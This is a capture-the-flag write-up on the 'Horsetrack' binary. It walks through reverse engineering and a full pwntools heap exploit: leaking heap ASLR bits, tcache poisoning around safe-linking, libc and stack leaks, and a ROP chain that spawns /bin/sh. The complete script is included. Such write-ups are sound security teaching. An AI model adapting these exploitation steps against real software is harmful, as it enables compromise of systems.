# Horsetrack

Before I begin, I will mention that I was only able to pop a shell locally for reasons beyond me. Regardless, I still
found the solution I came up with to do this much locally interesting and I enjoyed coming up with it so I wanted to
share anyway :)

## Looking at the binary and inital guess work

At first glance, the binary appears to give us four options:

![image](https://user-images.githubusercontent.com/96510931/228019847-3336d337-0613-4888-94da-6ea7c50e8bfc.png)

Option 1 asks for a stable index and name length between 16 and 256 characters, then prompts the user for a name.
This automatically feels like it might do some sort of heap allocation of which we may be able to abuse if we can
tinker with the memory after the allocations made are freed. 

![image](https://user-images.githubusercontent.com/96510931/228020932-7c3974c2-dbb7-4443-b0c1-8ee53d9ac562.png)

Option 2 just asks for a stable index to specify which horse to remove. This likely frees the memory allocated
in option one. Of course, these are still just assumptions for the time being, I will further inspect these options
using reverse engineering tools to confirm my suspicions.

![image](https://user-images.githubusercontent.com/96510931/228021509-b15de5eb-799e-4023-8a2e-6a26ceabfcac.png)


Option 3 allows you to race all the horses you've added, and it will print a fancy little ascii representation of the
horses racing. What ever, the important part here is it prints the name of the winner once the race is over which could
potentially be used to leak information alongside some heap-based vulnerabilities if my earlier suspicions hold up.

![image](https://user-images.githubusercontent.com/96510931/228023291-eea6c627-e968-42e6-ae47-c516bb8ebdce.png)

It is also worth noting that I was unable to race if I had 4 or less horses added.

![image](https://user-images.githubusercontent.com/96510931/228023461-de3e6a41-b808-4a5a-8bd6-2099b895b9f1.png)


Lastly, option 4 should be fairly self explanatory. Not really of much interest to me.


## But wait, there is more ...

Upon further inspection, after downloading the binary and decompiling it in IDA, there appears to be another
secret option which they do not display in the menu prints. The value v5 is the user's answer to the choice prompt,
and as you can see in the image below, there is a case 0 despite an option 0 not being displayed:

![image](https://user-images.githubusercontent.com/96510931/228020421-f9b5b9fc-fb60-4726-affb-34cf285f49d8.png)

Upon giving it a try, I was right. There is a secret option which lets you modify one of the horses. 

![image](https://user-images.githubusercontent.com/96510931/228024759-b82a737a-44ef-4906-a362-0e641949e66f.png)

There is a complication, however. If we try racing after modifying a horse we are unable to race and the program exits.

![image](https://user-images.githubusercontent.com/96510931/228026115-8f9a29bf-73f7-4cc8-8d0f-b1cb8751b064.png)

We will have to find a way around this, but first lets actually make sure that this will infact involve heap exploitation
and see what else we can find by digging around in IDA.


## Reverse engineering

### Option 1: Add horse

I've renamed the function called in case 1 of the switch statement accordingly:

![image](https://user-images.githubusercontent.com/96510931/228028855-9bfa2cbf-71bc-436c-8d5a-b6ede8b03e99.png)

Upon further inspection, they do infact appear to do a malloc like I originally suspsected. As messy as the line with
malloc is, this just appears to be saving the pointer to an array of pointers to each allocation.

![image](https://user-images.githubusercontent.com/96510931/228029017-51227682-0a01-43dc-9d17-e6dba8a650f7.png)

Additionally, they call this sub_401226 function which appears to be reading the name of the horse. Upon further
inspection of this function, it looks like it will stop reading characters from the user when it sees a 0xFF byte.
Note taken. I've renamed this function read_name for readability purposes, see below:

![image](https://user-images.githubusercontent.com/96510931/228030184-78016630-c428-4036-8db4-56e710c4ac19.png)

### Option 2: Remove horse

Like before, I've renamed the function called in case 2 of the switch statement accordingly:

![image](https://user-images.githubusercontent.com/96510931/228030682-6c3f6b2f-d06c-46fe-bd88-97fee510aaaf.png)

Once again, my earlier predictions are correct. This frees the pointer at the index we specify. It is slightly frustrating
that they set the pointer to zero after it is freed as it makes a use-after-free attack on any given allocation slightly
more difficult, but there might be a way around it (spoiler alert there is).

![image](https://user-images.githubusercontent.com/96510931/228030852-1b6650a5-edbb-4f72-b39d-ea0b7acc5dee.png)

## Option 3: Race

Before actually looking into the functions called by race, I want to take a look at case 3 of the switch statement
one more time, as there is a bit more going on.

![image](https://user-images.githubusercontent.com/96510931/228072151-40b961d7-b4f0-411d-a0f6-d62ea34f1100.png)

First of all, we can see that if dword_4040EC is non-zero, we get caught cheating and setting v6 equal to 1 terminates
the forever loop the switch statement is inside of which in turn prevents us from racing (or doing anything else for that
matter).

This dword_4040EC comes from the .bss section as shown below. This is likely what prevents us from racing if we try
to use the secret option to cheat and modify a horse. On the bright side, it shouldn't be too difficult to overwrite
this value once we have arbitrary read write since the binary does not have PIE enabled.

![image](https://user-images.githubusercontent.com/96510931/228072093-50ee2c2b-feda-4f8a-a0f0-32664a4593e4.png)

Next, by looking further into the count_horses, a_horse_has_won, and move_horses functions, all of which I have named accordingly,
we can see that horses are part of the race if the pointer is non-zero. This is slightly problematic for abusing a use-after free
since we observed that remove_horse zeros out the respective pointer when a horse is removed. 

![image](https://user-images.githubusercontent.com/96510931/228072641-cc515ec3-34ce-48b2-a2be-4e47dc82897c.png)
![image](https://user-images.githubusercontent.com/96510931/228072700-c24a54e3-8755-4755-adfd-8e57031242c2.png)
![image](https://user-images.githubusercontent.com/96510931/228072745-2e6d1630-1e17-4015-a78b-5e16d118202a.png)


## Option 0: Cheating

Just like options 1 and 2, I've renamed the function called in case 0 accordingly. It is worth noting that upon taking this
particular code path that the .bss variable which keeps track of whether or not we have cheated is set to one. So in order to
race again, we will have to reset this back to zero via arbitrary read write like mentioned earlier.

![image](https://user-images.githubusercontent.com/96510931/228068273-ffe48b2e-6123-4006-976e-c0926fbee69b.png)

Looks like the cheat function calls the read_name function that was also called in add_horse. Since they also give us a new spot
to place it, we can also un-zero the pointer if it was freed allowing us to actually use the horse in the race. Recall the spoiler
alert I gave when talking about remove_horse, as this is the work around.

![image](https://user-images.githubusercontent.com/96510931/228070309-84e2104d-ef63-4d1d-bc95-19ad37ea5cf4.png)


## The exploitation beings

With all that, we can begin thinking about how we will exploit this. I will be attempting to pop a shell. My high level approach will
consist of:
- Leak the ASLR bits from the heap to cope with the fact that their version of libc has safe linking. Note that we will not be able to
  abuse the cheat option to do this as we do not have arbitrary read write yet to set that .bss variable back to zero.
- Once we have the ASLR bits, we will be able to cope with safe-linking, which will let us cheat and continue to race anyway. We will take
  advantage of this fact to leak an address from LIBC.
- After obtaining the base address of LIBC, we will be able to locate the stack with another leak. I will use this leak to find a return
  pointer we can overwrite with a ROP chain. We should have plenty of gadgets to work with since we should have a LIBC leak.
- Last, overwrite the return pointer and use ROP to pop a shell.

Each of these steps will be explained further in detail below.

### Boilerplace

Just to get the obvious out of the way and keep the script somewhat clean, here is the boilerplate pwntools instantiation of the
process and ELF object, in addition to some functions which we can use to easily pick one of the options given to us by the binary.

```
from pwn import *

p = process('./vuln')
e = ELF('./vuln')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def cheat(index, name, newspot):
┊   p.sendline(b'0')
┊   p.sendline(str(index).encode())
┊   p.sendline(name)
┊   p.sendline(str(newspot).encode())

def add_horse(index, length, name):
┊   p.sendline(b'1')
┊   p.sendline(str(index).encode())
┊   p.sendline(str(length).encode())
┊   p.sendline(name)

def remove_horse(index):
┊   p.sendline(b'2')
┊   p.sendline(str(index).encode())

def race():
┊   p.sendline(b'3')
```

### Coping with safe-linking

In order to obtain arbitrary read-write, we will have to be able to overwrite the next pointer on a freed heap allocation and 
then malloc until we get an allocation pointing to where we specified. However, safe-linking presents a mitigation from doing this by
jumbling the next pointer. If we are to do tcache poisoning, we will have to replicate this pointer jumbling. 

Thankfully, the pointer jumbling is rather simple. It just XORs the pointer with the address of the allocation, shifted
12 bits to the right. In other words, the next pointer is XORed with the random bits from the address of the allocation. 

We do not yet have the luxury of the cheat option yet, however we can abuse the fact that the function which reads the name of
the horse stops reading characters once it sees a 0xFF byte. Knowing this, the ASLR bits of these heap allocations can be leaked as follows:

```
for i in range(8):
┊   add_horse(i, 256, b'i' * 256)
┊   remove_horse(i)
┊   add_horse(i, 256, b'\xFF')
race()

p.recvuntil(b'WINNER: ')
aslr = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f'aslr: {hex(aslr)}')

remove_horse(0)
remove_horse(1)
```

NOTE: I'm allocating all the horses I will need for the entire exploit at this point which is why I'm allocating 8 specifically.
Additionally, I'm using the largest allocation size possible (256) to give myself as much room to send my ROP chain as I can. Plus,
we need at least five to race anyway, but I'm mainly just thinking ahead.

Output:

![image](https://user-images.githubusercontent.com/96510931/228078681-50ce3b47-af23-4406-9c13-41f49c6836b0.png)

Looks promising, so I'll elaborate on why this worked. In the for loop, I start by allocating a horse which does a malloc. Immediately
afterwards I free this horse, which puts heap metadata where the allocation once was. Since there was nothing in the tcache prior to
making this allocation, the ASLR bits are just XORed with zero, meaning the saved next pointer is just the ASLR bits. Adding another
horse again and sending nothing but an 0xFF byte as the name leaves the contents of the next pointer, which contains the ASLR bits, alone
and also gets rid of this entry from the tcache, allowing the same exact thing to happen in the next iteration of the for loop. 

So, when any of these horses win, the pointer to their name, which points to the next pointer which contains the ASLR bits, is 
printed after the word WINNER. It is also important that these horses are allocated, because if they are not they do not count in the race (recall
how remove_horse sets the pointer to zero, and that horses only participate in the racee if their respective pointer is non-zero).

Lastly, I'm removing horses 0 and 1 in preperation for what I am about to do next...

### Leaking LIBC

Now we get to be a dirty cheater and get away with it. An address in LIBC can be leaked, and the base address of LIBC can be calculated
as follows:

```
add_horse(0, 256, b'i' * 256)
add_horse(1, 256, b'i' * 256)

remove_horse(1)
remove_horse(0)

cheat(0, p64(0x4040E0 ^ aslr) + b'\xFF', 0)

add_horse(0, 256, b'\x00' * 256)
add_horse(1, 256, b'\xFF')

leak = aslr
while leak == aslr or leak == 0:
┊   race()
┊   p.recvuntil(b'WINNER: ')
┊   leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
libc_base = leak - 0x1BE5E0
print("Libc base: " + hex(libc_base))
```

Output:

![image](https://user-images.githubusercontent.com/96510931/228106106-e3b8fed0-da3c-4c6d-b75b-41882caa12b5.png)


Looks promising once again. Because I added horse 0 and 1 then removed them both immediately after, they enter the tcache. Next, I
use the cheat option to overwrite the next pointer. Note, because of the safe-linking pointer jumbling, the address we want to overwrite needs
to be XORed with the ASLR bits leaked earlier. 

After I re-add horse 1, we're given an allocation at 0x4040E0. I chose to place this allocation at 0x4040E0 for a few reasons. In the following
screenshot, I was able to attach to the process in GDB and inspect the return value in $rax immediately after returning from the malloc call
which gives us the allocation at 0x4040E0 to help me explain why.

![image](https://user-images.githubusercontent.com/96510931/228103248-5761dbe4-b83e-4429-812f-3aab8b74e530.png)

We can in fact see that malloc returned 0x4040E0 indicating that our allocation was placed at 0x4040E0. My reasoning behind this specific choice
for an address to place an allocation on top of is as follows:
- First, since this points to directly to stderr, we are able to leak an address in LIBC which can be used to calculate the base address of LIBC.
- Second, the 8-bytes after the first 8-bytes are zeroed out. These next 8-bytes are known as the "key" as far as heap metadata is concerned, and they
  are zeroed out when a malloc occurs. This is actually good, because this behavior from malloc just zeroed out the .bss variable which is preventing
  us from racing again.
- Third, in newer versions of LIBC all allocations have to follow a certain alignment. Specifically, the 4 least significant bits must all be zero.

So with this specific allocation placement, we are able to bypass their cheating check, and also get a pointer directly to a LIBC address which will
be printed as if it were a horses name once the horse with this particular allocation wins. I'm aware that the names are also printed while they are
racing, I just felt using p.recvuntil(b'WINNER: ') then reading what came after was a little cleaner. My while loop simply just waits for the horse
associated with our malicious allocation to win so we can capture the LIBC leak once it's printed after the word WINNER.

### Finding the stack (and a return pointer)

We are going to need to set up another race to leak something from the stack. Since we now know where LIBC is, we can actually locate the stack by
finding a pointer in LIBC and leaking it. I have found myself needing to do this in the past, and I typically resort to the .bss section of LIBC. In
the following screenshots, there is a pointer which points to something on the stack. We can confirm this comes from the stack by looking at output
from info proc mappings.

![image](https://user-images.githubusercontent.com/96510931/228108148-2684426c-cc23-4a27-823f-455227342183.png)

![image](https://user-images.githubusercontent.com/96510931/228108227-251c4fc3-6de5-4df1-8733-b910024b49ef.png)

![image](https://user-images.githubusercontent.com/96510931/228108372-048b2c57-72c9-4e8b-bbff-470eddd513a2.png)

This particular address is always a specific distance away from the base address of LIBC, and can be leaked as follows:

```
remove_horse(3)
remove_horse(2)

cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)

add_horse(2, 256, b'\xFF')
add_horse(3, 256, b'\xFF')

remove_horse(5)
remove_horse(4)

cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)

add_horse(4, 256, b'\x00' * 256)
add_horse(5, 256, b'\xFF')

another_leak = 0
while another_leak == 0 or another_leak == leak or another_leak == aslr:
┊   race()
┊   p.recvuntil(b'WINNER: ')
┊   another_leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f"stack leak is: {hex(another_leak)}")
```

In this chunk of code, horses 2 and 3 are placed into tcache, the cheat option is used to overwrite a next pointer, and the
chunks are reallocated. Nothing but 0xFF bytes are given for the names so that the value we want to leak is not changed as the
name is read. Then 2 and 3 are re-allocated giving us a pointer which points to a pointer to something on the stack, which will
be printed when the corresponding horse to the allocation wins the race, just like before. Next, just like when we leaked LIBC, 
an allocation is placed on top of stderr and the .bss variable which is used to determine if we are cheating is cleared again by
malloc. My while loop for this race was a little messy, but by the end of it we will have a stack leak.

Output (with verification that the leaked address is from the stack):

![image](https://user-images.githubusercontent.com/96510931/228109659-9ae144f6-42b5-4b9b-8b18-0f338829703e.png)

### Finding a return pointer to overwrite

Before thinking about the ROP chain, we have to know where to put it. Since we have obtained some pointer that points to something
on the stack, we can find a return pointer that lives close to it and use GDB to calculate the offset between our leak and the return
pointer. I decided to overwrite the return pointer belonging to main's stack frame so that once I choose option 4, we will get
our shell instead of exiting.

![image](https://user-images.githubusercontent.com/96510931/228112567-02a90286-3ffa-4078-837d-1175f3b22895.png)

Doing this is totally okay since all the exit option does (case 4 in the screenshot above) is alter the v6 variable which prevents
the while loop from looping any further. If option 4 had utilized a call to exit(), main's return pointer would not be a good choice.

In the screenshot below, I've broken somewhere in main and ran info frame to locate where the return pointer is:

![image](https://user-images.githubusercontent.com/96510931/228111378-2a3be632-fab5-456a-add1-84d81d2d9c5a.png)

Next, still while in GDB, I let my script do it's thing and give me the stack address it is now able to leak:

![image](https://user-images.githubusercontent.com/96510931/228111461-910cc922-1427-4e1c-8592-0beb7972d420.png)

Next, we can easily calculate how much we need to subtract from our leak to determine where the saved rip of main is:

![image](https://user-images.githubusercontent.com/96510931/228111858-7ce5b118-1a75-4adc-9d3c-9c4524390829.png)

There is one more thing to consider before trying to place an allocation on top of the saved RIP, and that is we cannot just place an
allocation directly on top of the saved RIP. The reason being is because it does not meet the alignment requirements that are
forced upon us by newer versions of LIBC. So, instead of subtracting 0xF0 bytes from the stack leak I will subtract 0xF8 and just remember
that I will need 8 extra padding bytes to align the start of my ROP chain properly.

### Creating and sending the ROP chain

As I mentioned earlier, I want to pop a shell. So all I need to construct my ROP chain is a pop rdi gadget, a "/bin/sh" string, and a way
to call the system function which the vulnerable binary kindly provides to us via the PLT. Finally, when constructing the final payload
all I need is an additional 8 garbage bytes before the ROP chain, and I also added a 0xFF byte just so it wouldn't try to keep reading.

```
ret_ptr_loc = another_leak - 0xF8
print(f"return pointer is at: {hex(ret_ptr_loc)}")

libc = ELF('./libc.so.6')
rop = ROP(libc)

pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))

chain = p64(pop_rdi) + p64(bin_sh) + p64(e.plt['system'])
payload = p64(0) + chain + b'\xFF'

remove_horse(7)
remove_horse(6)

cheat(6, p64(ret_ptr_loc ^ aslr) + b'\xFF', 6)

add_horse(6, 256, b'\xFF')
add_horse(7, 256, payload)
```

The same heap trickery is used to get an allocation 8 bytes before main's return pointer. The return pointer is overwritten after the malloc
when they prompt the user for the name of the horse, so we provide the payload as the name to add_horse() for allocation 7. Lastly, we can
do some quick checks to make sure everything landed in the right place in GDB:

![image](https://user-images.githubusercontent.com/96510931/228116208-66947080-9e4a-4d55-808f-555811a0b7f8.png)

Bingo!

### Popping a shell

The rest is easy. Since we overwrote the return pointer in main, all we have to do is give '4' to the prompt to choose the exit option to stop
the while loop and return from main. Note, my scripting is far from perfect so it may take a couple tries:

```
p.sendline(b'4')
p.interactive()
```

Yeah, I'm just sending '4' because I was too lazy to write a wrapper function for option 4 at this point.

# The final script, and result

The final script:

```
from pwn import *

p = process('./vuln')
e = ELF('./vuln')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def cheat(index, name, newspot):
    p.sendline(b'0')
    p.sendline(str(index).encode())
    p.sendline(name)
    p.sendline(str(newspot).encode())

def add_horse(index, length, name):
    p.sendline(b'1')
    p.sendline(str(index).encode())
    p.sendline(str(length).encode())
    p.sendline(name)

def remove_horse(index):
    p.sendline(b'2')
    p.sendline(str(index).encode())

def race():
    p.sendline(b'3')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

for i in range(8):
    add_horse(i, 256, b'i' * 256)
    remove_horse(i)
    add_horse(i, 256, b'\xFF')
race()

p.recvuntil(b'WINNER: ')
aslr = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f'aslr: {hex(aslr)}')

remove_horse(0)
remove_horse(1)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

add_horse(0, 256, b'i' * 256)
add_horse(1, 256, b'i' * 256)

remove_horse(1)
remove_horse(0)

cheat(0, p64(0x4040E0 ^ aslr) + b'\xFF', 0)

add_horse(0, 256, b'\x00' * 256)
add_horse(1, 256, b'\xFF')

leak = aslr
while leak == aslr or leak == 0:
    race()
    p.recvuntil(b'WINNER: ')
    leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
libc_base = leak - 0x1BE5E0
print("Libc base: " + hex(libc_base))

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

remove_horse(3)
remove_horse(2)

cheat(2, p64((libc_base + 0x1bf620) ^ aslr) + b'\xFF', 2)

add_horse(2, 256, b'\xFF')
add_horse(3, 256, b'\xFF')

remove_horse(5)
remove_horse(4)

cheat(4, p64(0x4040E0 ^ aslr) + b'\xFF', 4)

add_horse(4, 256, b'\x00' * 256)
add_horse(5, 256, b'\xFF')

another_leak = 0
while another_leak == 0 or another_leak == leak or another_leak == aslr:
    race()
    p.recvuntil(b'WINNER: ')
    another_leak = int.from_bytes(p.recvuntil(b'\n').replace(b'\n', b''), 'little')
print(f"stack leak is: {hex(another_leak)}")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

ret_ptr_loc = another_leak - 0xF8
print(f"return pointer is at: {hex(ret_ptr_loc)}")

libc = ELF('./libc.so.6')
rop = ROP(libc)

pop_rdi = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))

chain = p64(pop_rdi) + p64(bin_sh) + p64(e.plt['system'])
payload = p64(0) + chain + b'\xFF'

remove_horse(7)
remove_horse(6)

cheat(6, p64(ret_ptr_loc ^ aslr) + b'\xFF', 6)

add_horse(6, 256, b'\xFF')
add_horse(7, 256, payload)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

p.sendline(b'4')
p.interactive()
```

Output (after running it a few times, again it's not perfect):

![image](https://user-images.githubusercontent.com/96510931/228116896-a9be5add-79b5-48df-8f33-9b336ca2dcc3.png)

